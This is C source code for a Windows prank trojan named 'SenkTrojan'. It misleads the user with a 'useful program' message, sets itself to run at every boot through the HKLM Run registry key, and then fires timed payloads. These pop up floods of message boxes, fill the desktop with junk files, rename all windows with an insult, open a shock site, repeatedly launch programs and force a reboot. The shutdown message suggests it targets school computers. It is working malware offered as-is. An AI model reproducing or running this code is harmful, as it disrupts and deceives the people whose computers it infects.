/*
    SenkTrojan by MrOnlineCoder

    A simple trojan written in C using WinAPI

    Payloads:
    1. At 11:00 - shows a bunch of annoying messages
    2. At 12:00 - fills the desktop with a trash files
    3. At 13:00 - changes windows' titles
    4. At 13:37 - opens youareanidiot.org :)
    5. At 14:00 - shutdowns the PC

    github.com/MrOnlineCoder

    MIT License

    Copyright (c) 2017 MrOnlineCoder (Nikita Kogut)
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
*/


#include "windows.h"
#include "wincrypt.h"

#include <windows.h>
#include <shlobj.h>
#include <winuser.h>

#define PAYLOAD_DELAY 10000
#define INTERVAL 10000

int isRunning;
const char* programs[] = {
    "notepad.exe","calc.exe","mspaint.exe","cmd.exe", "mmc.exe"
};

int programsSize = 5;

/*

    UTILITY FUNCTIONS

*/

LPSTR desktop_directory()
{
    static wchar_t path[MAX_PATH+1];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY,NULL, 0, path)))
        return path;
    else
        return "ERROR";
}


/*

    A lot of next code was written by Leurak in MEMZ (github.com/Leurak/MEMZ)
    Thanks!

*/
HCRYPTPROV prov;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}


LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

void createFile(char* name) {
    const wchar_t msg[] = L"Senk you!";
    DWORD dwCounter, dwTemp;
    HANDLE hFile = CreateFile(name, GENERIC_READ | GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // create file handle
    if(INVALID_HANDLE_VALUE == hFile) {
        return;
    }



    //Write to file our text
    WriteFile(hFile, msg, sizeof(msg), &dwTemp, NULL);

    CloseHandle(hFile);
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{

	SetWindowText(hwnd, "Vova Sucks! Vova Sucks! Vova Sucks! Vova Sucks! Vova Sucks! Vova Sucks! Vova Sucks!");
	return TRUE;
}

void putInAutorun() {
    TCHAR szPath[MAX_PATH];

	GetModuleFileName(NULL,szPath,MAX_PATH);

	HKEY newValue;

	RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);

	RegSetValueEx(newValue,"SenkTrojan",0,REG_SZ,(LPBYTE)szPath,sizeof(szPath));

	RegCloseKey(newValue);
}



/*
     PAYLOADS CODE
*/
DWORD WINAPI payload1(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"11 lol", L"Senk you", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

void payload2(int n) {
    wchar_t* desktop = desktop_directory();
    wchar_t path[MAX_PATH+1] = {0};
    sprintf(path, "%s\\senkyou_%d.txt",desktop, n);
    createFile(path);
}

void payload3() {
    EnumWindows(EnumWindowsProc, NULL);
}

void payload4() {
    ShellExecute(NULL, "open", "http://www.youareanidiot.org/", NULL, NULL, SW_SHOWNORMAL);
}

void payload5() {
    ShellExecute(NULL, "open", "shutdown", "-r -t 60 -c \"It's time to end lessons! Source code: github.com/MrOnlineCoder/Senk\"",  NULL, SW_SHOWNORMAL);
}

void payload6() {
    HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	int w = rekt.right - rekt.left;
    int h = rekt.bottom - rekt.top;
    StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);
}

void payload7() {
    for (int i=0;i<10;i++) {
        ShellExecute(NULL, "open", programs[random() % programsSize], NULL,  NULL, SW_SHOWNORMAL);
    }

}

int main(int argc, char* argv[]) {
    MessageBoxA(NULL, "Senk you for using this useful program! P.S. Source code: github.com/MrOnlineCoder/Senk", "by MrOnlineCoder", MB_OK | MB_ICONEXCLAMATION);

    isRunning = 1;

    putInAutorun();


    while (isRunning == 1) {
        SYSTEMTIME st;
        GetLocalTime(&st);

        //Payloads

        WORD mins = st.wMinute;
        WORD hours = st.wHour;
        WORD secs = st.wSecond;

        if (mins == 0 && hours == 11 && secs <= 20) {
            for (int i=0;i<50;i++) {
                CreateThread(NULL, 0, &payload1, NULL, NULL, NULL);
                Sleep(50);
            }
            Sleep(PAYLOAD_DELAY);
        } else if (mins == 0 && hours == 12 && secs <= 20) {
            for (int i=0;i<250;i++) {
                payload2(i);
                Sleep(50);
            }
            ShowWindow(GetDesktopWindow(), SW_SHOWNORMAL);
            Sleep(PAYLOAD_DELAY);
        } else if (mins == 0 && hours == 13 && secs <= 20) {
            payload3();
            Sleep(PAYLOAD_DELAY);
        } else if (mins == 37 && hours == 13 && secs <= 20) {
            payload4();
        } else if(mins == 0 && hours == 14 && secs <= 20) {
            payload5();
        } else if (mins == 30 && hours == 14 ) {
            for (int i=0;i<20;i++) {
                payload6();
                Sleep(50);
            }

        }

        if (mins == 59 && secs <= 20) {
            payload7();
            Sleep(PAYLOAD_DELAY);
        }

        Sleep(INTERVAL);
    }

    return 0;
}
